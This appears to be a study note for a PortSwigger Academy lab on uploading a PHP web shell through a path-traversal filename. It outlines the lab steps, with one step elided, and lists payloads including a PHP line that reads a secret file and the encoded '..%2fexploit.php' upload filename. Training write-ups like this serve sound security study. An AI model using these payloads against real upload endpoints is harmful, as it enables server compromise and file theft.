# Lab: Web shell upload via path traversal

**Official lab:** [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

## Lab idea

This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability. The challenge combines upload handling with a path-handling weakness: a restriction on execution can be undermined if an uploaded file is placed somewhere unexpected. It practices considering both file processing and destination paths.

## Vulnerability in brief
There is no widely used acronym for this topic.

## Solution idea
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> .
3. On your system, create a file called exploit.php , containing a script for fetching the contents of Carlos's secret.
4. Upload this script as your avatar.
- …
6. In the browser, go back to your account page.
7. In Burp's proxy history, find the GET /files/avatars/..%2fexploit.php request.
8. Submit the secret to solve the lab.

## Payloads / key values
- `GET`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `GET /files/avatars/<YOUR-IMAGE>`
- `POST /my-account/avatar`
- `Content-Disposition`
- `filename`
- `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
- `The file avatars/exploit.php has been uploaded.`
- `/`
- `filename="..%2fexploit.php"`
- `The file avatars/../exploit.php has been uploaded.`
- `GET /files/avatars/..%2fexploit.php`
- `/files`
- `GET /files/exploit.php`

## Official source
- [PortSwigger Academy: Lab: Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
